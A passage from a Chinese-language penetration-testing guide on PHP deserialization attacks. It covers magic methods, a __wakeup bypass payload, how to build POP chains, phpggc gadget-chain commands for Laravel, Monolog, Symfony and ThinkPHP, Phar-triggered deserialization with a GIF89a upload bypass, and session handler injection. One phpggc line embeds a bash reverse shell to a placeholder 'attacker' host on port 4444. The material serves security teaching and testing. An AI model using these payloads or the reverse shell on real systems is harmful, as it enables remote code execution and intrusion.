## 八、PHP 反序列化 POP 链构造实战

### 8.1 魔术方法与序列化格式
```php
__construct() / __destruct()  // 创建/销毁时
__wakeup()                   // unserialize() 时（CVE-2016-7124 可绕过）
__toString()                 // 对象被当字符串时（最常用链点）
__get($n) / __set($n,$v)     // 访问/设置不存在属性
__isset() / __unset()        // isset/empty/unset 不存在属性
__invoke()                   // 对象被当函数调用
__call($m,$a) / __callStatic()  // 调用不存在方法
__sleep()                    // serialize() 前
// 格式：O:4:"User":2:{s:4:"name";s:5:"admin";s:3:"age";i:20;}
// __wakeup 绕过：属性计数大于实际个数则不执行 __wakeup
O:4:"Test":2:{s:3:"cmd";s:2:"id";}   // 2 > 1 → 跳过 __wakeup（PHP<7.4 有效）
```

### 8.2 POP 链构造方法论（实战步骤）
```
1. 定位入口：审计 unserialize() 调用点；识别可传入对象图的参数（Cookie/Session/DB 字段/JSON）
2. 收集链点类：grep 所有定义了 __destruct/__wakeup/__toString/__call 的类
3. 追踪调用：从链点方法体出发，人工/工具追踪其调用的其他方法/属性（xdebug 断点 + var_dump 辅助）
4. 找危险 Sink：system/exec/shell_exec/eval/assert/preg_replace(/e)/file_put_contents/include/require/unserialize(嵌套)
5. 拼装：自底向上构造对象图——先实例化 Sink 侧对象，再用链点类包装，最后序列化
6. 验证：本地搭同名依赖环境（composer 同版本），直接 unserialize 验证 POP 链有效性
```
```php
// 典型 POP 链骨架（思想示例：A.__destruct → B.__toString → system）
class A { public $b; public function __destruct() { echo $this->b; } }        // 链点1：当字符串
class B { public $cmd; public function __toString() { system($this->cmd); } } // 链点2：Sink
$payload = serialize(new A());   // 需手工填充 $b = new B()
```

### 8.3 phpggc（PHP Generic Gadget Chains）
```bash
./phpggc -l                              # 列出全部链
./phpggc Laravel/RCE1 system id           # 框架链
./phpggc Monolog/RCE1 system id
./phpggc Symfony/RCE4 system id
./phpggc ThinkPHP/RCE1 system id
./phpggc -p phar Laravel/RCE1 system id > payload.phar   # Phar 格式
./phpggc -w phar://xxx Monolog/RCE1 system id            # wrapper 封装
./phpggc Laravel/RCE1 system 'bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"' | base64 -w0
```

### 8.4 Phar 反序列化（无需 unserialize() 的入口）
```php
// 原理：phar 元数据在任意文件操作函数中自动反序列化
// 触发点：file_exists/fopen/file_get_contents/is_dir/include/stat 等 + phar:// 伪协议
file_exists('phar://upload/avatar.phar/test.txt');
// 生成：phpggc -p phar ... ；绕过上传：文件头加 GIF89a 签名
// PHP 8.0+ 部分环境中 phar 元数据处理策略变化，但 phar:// 触发面仍广泛存在
```

### 8.5 Session 反序列化与引擎不一致
```php
// php / php_serialize / php_binary 三种引擎存储格式不同
// 若 session.serialize_handler 与存储时不一致，可注入对象：
// php 引擎存储 "key|value"，php_serialize 引擎读取时把 | 后内容按 serialize 解析 → 构造 |O:4:"Test":1:{...}
```

